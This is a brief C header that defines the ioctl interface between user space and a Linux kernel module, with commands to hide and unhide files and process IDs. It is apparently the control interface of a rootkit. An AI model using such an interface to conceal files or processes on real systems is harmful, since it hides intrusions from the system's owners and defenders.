#ifndef COMMON_H
#define COMMON_H

#ifdef __KERNEL__
#include <linux/ioctl.h>
#else
#include <sys/ioctl.h>
#endif

#define IOCTL_MAGIC 'k'

#define MAX_HIDDEN_NAME 256
#define MAX_PID_STR     32

#define IOCTL_HIDE_FILE   _IOW(IOCTL_MAGIC, 0, char[MAX_HIDDEN_NAME])
#define IOCTL_UNHIDE_FILE _IOW(IOCTL_MAGIC, 1, char[MAX_HIDDEN_NAME])
#define IOCTL_HIDE_PID    _IOW(IOCTL_MAGIC, 2, char[MAX_PID_STR])
#define IOCTL_UNHIDE_PID  _IOW(IOCTL_MAGIC, 3, char[MAX_PID_STR])

#endif